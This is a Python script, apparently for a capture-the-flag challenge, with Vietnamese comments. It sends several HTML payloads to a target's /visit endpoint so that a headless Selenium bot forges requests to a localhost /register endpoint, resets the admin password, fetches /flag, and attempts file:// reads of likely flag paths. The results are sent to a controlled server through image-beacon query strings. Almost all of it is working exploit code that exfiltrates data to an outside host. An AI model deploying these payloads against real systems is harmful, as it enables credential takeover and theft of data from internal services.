#!/usr/bin/env python3
# try_many_payloads.py
# Gửi nhiều payload khác nhau (data:, direct URL, iframe, form...) tới /visit của target.
# Mục tiêu: khiến Selenium (chạy trên target) POST tới /register (từ localhost) hoặc truy cập /flag
# và exfiltrate flag về server bạn (TARGET).

import requests, base64, time

# ==== CẤU HÌNH ====
TARGET = " http://34.72.72.63:26737"   # service target (CTF)
NEW_PASS = "pwntest123"               # password mà chúng ta sẽ cố gắng đặt
TIME_BETWEEN = 1.0                    # giây giữa các requests
# ==================

def data_url_from_html(html):
    b64 = base64.b64encode(html.encode()).decode()
    return "data:text/html;base64," + b64

payload_templates = []

# 1) fetch POST with custom headers (thường bị CORS)
payload_templates.append(("fetch-register-headers", f"""
<!doctype html><html><body>
<script>
(async()=>{{try{{ 
  await fetch("http://127.0.0.1:8080/register", {{
    method: "POST",
    headers: {{ "X-Username": "admin", "X-Password": "{NEW_PASS}" }},
    body: ""
  }});
  let r = await fetch("http://127.0.0.1:8080/flag", {{
    headers: {{ "Authorization": "Basic " + btoa("admin:{NEW_PASS}") }}
  }});
  let t = await r.text();
  (new Image()).src = "{TARGET}/?flag=" + encodeURIComponent(t);
}}catch(e){{ (new Image()).src = "{TARGET}/?err=fetch1_" + encodeURIComponent(String(e)); }}}})();
</script>
</body></html>
"""))

# 2) form POST to /register (no custom headers) — often useless because server expects headers, but try anyway
payload_templates.append(("form-post-register", f"""
<!doctype html><html><body>
<form id="f" action="http://127.0.0.1:8080/register" method="POST">
  <input type="hidden" name="x" value="1">
</form>
<script>
document.getElementById('f').submit();
setTimeout(()=>{{(new Image()).src="{TARGET}/?note=form_post_done"}}, 1500);
</script>
</body></html>
"""))

# 3) basic-auth direct navigation to /flag (no JS fetch) - try iframe + meta refresh - browser might send Basic header
payload_templates.append(("iframe-basic-auth-flag", f"""
<!doctype html><html><body>
<iframe src="http://admin:{NEW_PASS}@127.0.0.1:8080/flag" style="display:none"></iframe>
<!-- try also a navigation -->
<meta http-equiv="refresh" content="0;url=http://admin:{NEW_PASS}@127.0.0.1:8080/flag">
<!-- If navigation happens we can't exfil with JS on previous page; include a timeout image as fallback -->
<script>
setTimeout(()=>{{ (new Image()).src = "{TARGET}/?note=naved"; }}, 2000);
</script>
</body></html>
"""))

# 4) try to GET register URL with basic auth (maybe server logs or behavior change)
payload_templates.append(("direct-get-register-basic", f"""
<!doctype html><html><body>
<script>location.href = "http://admin:{NEW_PASS}@127.0.0.1:8080/register";</script>
</body></html>
"""))

# 5) attempt to read common file locations (try to fetch file:// paths) and exfiltrate (some setups allow)
file_paths = ["/flag.txt", "/home/ctf/flag.txt", "/flag", "/root/flag.txt", "/app/flag.txt"]
fetch_files_script = "(async()=>{{"
for p in file_paths:
    fetch_files_script += f"""
try{{ let r = await fetch("file://{p}"); if(r.ok){{ let t = await r.text(); (new Image()).src = "{TARGET}/?filepath={p}&data=" + encodeURIComponent(t); return; }}}}catch(e){{}} 
"""
fetch_files_script += ' (new Image()).src = "'+TARGET+'/?note=no_file_found"; })();'

payload_templates.append(("try-file-reads", "<!doctype html><html><body><script>"+fetch_files_script+"</script></body></html>"))

# helper to trigger /visit
def trigger_visit(payload_url):
    try:
        res = requests.post(
            f"{TARGET}/visit",
            headers={"X-Target": payload_url, "Content-Type":"application/x-www-form-urlencoded"},
            data="url=" + payload_url,
            timeout=8
        )
        print("  -> /visit:", res.status_code, repr(res.text[:200]))
    except Exception as e:
        print("  -> /visit EXC:", e)

if __name__ == "__main__":
    print("[*] Will attempt", len(payload_templates), "payload variants. TARGET =", TARGET)
    for name, html in payload_templates:
        print("\n[*] TRY payload:", name)
        data_url = data_url_from_html(html)
        # 1) Try sending data: URL (bot loads inline HTML)
        print("  - Sending data: URL payload")
        trigger_visit(data_url)
        time.sleep(TIME_BETWEEN)

        # 2) Also try sending direct URL (hosted) if data URL fails
        # Try direct http URL that contains HTML by pointing to admin:... (less likely)
        simple_url = f"http://{TARGET.replace('http://','').split(':')[0]}:{TARGET.split(':')[-1]}/"  # dummy, but we will also try direct basic-auth URL
        # Try direct basic-auth to flag
        basic_flag_url = f"http://admin:{NEW_PASS}@127.0.0.1:8080/flag"
        print("  - Sending direct basic-auth flag URL")
        trigger_visit(basic_flag_url)
        time.sleep(TIME_BETWEEN)

    print("\n[*] DONE. Now check the access logs of http server you control (http://{host}) for query strings like ?flag= or ?err= or ?note=")
    print("    If you get nothing, try increasing TIME_BETWEEN or re-run several times.")
